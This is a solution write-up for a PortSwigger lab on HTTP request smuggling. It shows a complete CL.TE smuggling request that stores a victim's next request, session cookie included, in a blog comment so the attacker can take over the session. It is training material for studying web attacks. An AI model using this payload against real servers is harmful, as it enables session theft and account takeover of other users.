# Lab 11 — Exploiting HTTP request smuggling to capture other users' requests

> **Practitioner** · [Official lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)

**Entry point:** smuggle a request whose `Content-Length` over-runs and
stores the victim's request (with their session) into a comment field.

## Solution

1. Post a comment; capture `POST /post/comment` (fields: csrf, postId,
   comment, name, email, website).
2. Smuggle an unterminated comment submission (token/value from your own
   request, long `Content-Length` so the victim's next request fills the
   `comment` field):

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 305
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=<your-session>

csrf=<your-csrf>&postId=5&name=a&email=a@a.com&website=&comment=
```

3. Wait for the victim to browse; open the blog post — their captured
   request (with session cookie) appears as a comment.
4. Use their session — lab solved. (Timeouts = shrink the smuggled
   Content-Length.)
